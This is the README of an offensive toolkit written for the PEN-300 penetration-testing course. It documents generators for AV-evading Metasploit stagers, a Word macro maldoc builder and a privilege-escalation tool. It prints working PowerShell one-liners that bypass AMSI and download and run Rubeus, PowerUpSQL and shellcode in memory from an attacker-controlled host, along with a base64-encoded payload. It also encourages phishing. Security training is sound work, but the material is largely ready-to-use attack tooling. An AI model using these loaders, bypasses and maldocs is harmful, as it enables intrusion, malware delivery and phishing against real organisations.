# Tools for my PEN-300 course

# Setup
* Update `webroot_url`, `webroot_dir`, `interface`, and `lport` in the `config.yml`
* By default, staged payloads will pull from the following URL `http://(LHOST)/sc`.
* Stageless payloads will automatically apply an XOR encryption to obfuscate the shellcode.

## Install Requirements
```
pip3 install -r requirements.txt

# Kali
apt install metasploit-framework mono-mcs wamerican

# Ubuntu
sudo apt install mono-mcs wamerican
wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run
chmod +x metasploit-latest-linux-x64-installer.run
sudo ./metasploit-latest-linux-x64-installer.run
```

## All Tools

```
generate_msf_linux_exe.py                   # Compile Linux MSF loader (XOR encoded to bypass AV)
generate_tool_loader.py                     # Generate PowerShell loader strings for Windows utilities
generate_win_hta.py
generate_win_installutil_ps_runner.py
generate_win_js.py
generate_win_msbuild_runner.py
generate_win_msf_pe_loader.py
generate_win_msf_stager.py                  # Create stager for MSF shellcode
generate_win_util_EfsPotato.py              # Compile EfsPotato Local PrivEsc Utility
generate_win_util_MiniDump.py               # Compile MiniDump Tool
generate_win_util_PowerupSQLScript.py       # Generate PowerupSQL automation script
generate_win_util_PrintSpooferNet.py        # Compile PrintSpooferNet utility for Windows local PrivEsc
generate_win_util_PSLessExec.py             # Compile PSLessExec tool for Windows lateral movement
generate_win_util_SQLAssembly.py            # Compile SQL Assembly for use with SQL Server Assembly RCE
generate_win_util_SQLClient.py              # Compile SQLClient Utility
generate_winword_macro.py                   # Generate Microsoft Word Maldoc
generate_win_xsl.py

```

## MSF Stager

```
usage: generate_win_msf_stager.py [-h] [--injection {hollow,interprocess,earlybird,standard}] [--msfpayload {reverse_winhttp,reverse_https}] [--format {exe,dll,aspx}] [--encrypt {xor,rc4}] [--heuristics]
                                  [--amsi] [--etw] [--stageless] [--output OUTPUT]

options:
  -h, --help            show this help message and exit
  --injection {hollow,interprocess,earlybird,standard}, -i {hollow,interprocess,earlybird,standard}
  --msfpayload {reverse_winhttp,reverse_https}
  --format {exe,dll,aspx}, -f {exe,dll,aspx}
  --encrypt {xor,rc4}, -e {xor,rc4}
  --heuristics
  --amsi
  --etw
  --stageless
  --output OUTPUT, -o OUTPUT
```

### Examples

```sh
# Create a dll that will use hollowing to load shellcode
python3 generate_win_msf_stager.py --injection hollow --format dll

# Encrypt with RC4
python3 generate_win_msf_stager.py --injection earlybird --format dll --encrypt rc4

# Create a stageless exe that will load and run shellcode within the same process
python3 generate_win_msf_stager.py --stageless --format exe

# Create a stageless aspx
python3 generate_win_msf_stager.py --stageless --format aspx
```

## Generate Tool Loading Commands

```
usage: generate_tool_loader.py [-h] [--no-amsi] [--base64]
                               {adhunttool,evilsqlclient,winpeas,efspotato,metdll,metexe,pslessexec,rubeus,scshell,seatbelt,sharpsploit,spoolsample,sharppersist,sqlclient,sharpup,sharprdp,sharphound,adpeas,getuserspns,hostrecon,lapstoolkit,rubeus-ps,powermad,powersharppack,powerupsql,powerview,runtxt,scshell-ps,seatbelt-ps,sharphound-ps,sharpsploit-ps,sharpersist-ps,sharpkatz-ps,sharpview-ps,winpeas-ps,winpwn,sysinternals,mimikatz,chisel}

positional arguments:
  {adhunttool,evilsqlclient,winpeas,efspotato,metdll,metexe,pslessexec,rubeus,scshell,seatbelt,sharpsploit,spoolsample,sharppersist,sqlclient,sharpup,sharprdp,sharphound,adpeas,getuserspns,hostrecon,lapstoolkit,rubeus-ps,powermad,powersharppack,powerupsql,powerview,runtxt,scshell-ps,seatbelt-ps,sharphound-ps,sharpsploit-ps,sharpersist-ps,sharpkatz-ps,sharpview-ps,winpeas-ps,winpwn,sysinternals,mimikatz,chisel}

optional arguments:
  -h, --help            show this help message and exit
  --no-amsi
  --base64, -b
```

### Examples
```
# Generate command loader
$ python3 generate_tool_loader.py rubeus
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);$b=(New-object system.net.webclient).DownloadData('http://10.10.14.110/tools/Rubeus.exe');$a=[System.Reflection.Assembly]::Load($b);[Rubeus.Program]::Main("triage".Split())

# Generate command loader without AMSI bypass
$ python3 generate_tool_loader.py --no-amsi powerupsql
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.110/tools/PowerUpSQL.ps1');Invoke-SQLAudit

# Base64 encode command for powershell
$ python3 generate_tool_loader.py --base64 powerupsql
Command encoded: $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);IEX(New-Object Net.WebClient).downloadString('http://10.10.14.110/tools/PowerUpSQL.ps1');Invoke-SQLAudit
powershell.exe -enc JABhAD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQBzACgAKQA7AEYAbwByAGUAYQBjAGgAKAAkAGIAIABpAG4AIAAkAGEAKQAgAHsAaQBmACAAKAAkAGIALgBOAGEAbQBlACAALQBsAGkAawBlACAAIgAqAGkAVQB0AGkAbABzACIAKQAgAHsAJABjAD0AJABiAH0AfQA7ACQAZAA9ACQAYwAuAEcAZQB0AEYAaQBlAGwAZABzACgAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEYAbwByAGUAYQBjAGgAKAAkAGUAIABpAG4AIAAkAGQAKQAgAHsAaQBmACAAKAAkAGUALgBOAGEAbQBlACAALQBsAGkAawBlACAAIgAqAEMAbwBuAHQAZQB4AHQAIgApACAAewAkAGYAPQAkAGUAfQB9ADsAJABnAD0AJABmAC4ARwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACkAOwBbAEkAbgB0AFAAdAByAF0AJABwAHQAcgA9ACQAZwA7AFsASQBuAHQAMwAyAFsAXQBdACQAYgB1AGYAIAA9ACAAQAAoADAAKQA7AFsAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAF0AOgA6AEMAbwBwAHkAKAAkAGIAdQBmACwAIAAwACwAIAAkAHAAdAByACwAIAAxACkAOwBJAEUAWAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQAxADAALwB0AG8AbwBsAHMALwBQAG8AdwBlAHIAVQBwAFMAUQBMAC4AcABzADEAJwApADsASQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQA
```

## Microsoft Word Maldoc Generator
Note: The Aspose-words library seems to have a bug where MS Word won't automatically execute Document_Open() or AutoOpen() on generated files.

As a workaround to resolve this:
  * Open the generated .doc file (*Leave Macros disabled when opening*)
  * Modify the `ThisDocument` VBA code by adding (or removing) an empty line 
  * Save document
  * Happy phishing!

### Maldoc Generation
* Note: If a 32-bit Office version is running, set `IS_64BIT` to `False`

```sh
# Update document name to something better
sed -i 's/DOC_NAME =.*/DOC_NAME = "Foobar.doc"/' generate_winword_macro.py

# Generate document
python3 generate_winword_macro.py
```


## EFSPotato Local Priv Escalation
The code is forked from https://github.com/zcgonvh/EfsPotato

I modified it to pull shellcode from the URL specified in the first argument, and then use process hollowing
to start an svchost.exe process and inject the shellcode into it.

### Standard Execution
```powershell
wget http://10.10.14.110/EfsPotato.exe -o C:\windows\tasks\EfsPotato.exe
C:\windows\tasks\EfsPotato.exe http://10.10.14.110/shellcode
```

### Using Assembly Reflection
```powershell
$u="http://10.10.14.110/EfsPotato.exe"
$b=(New-object system.net.webclient).DownloadData($u)
$a=[System.Reflection.Assembly]::Load($b)
[EfsPotato.Program]::Main("http://10.10.14.110/shellcode")
```

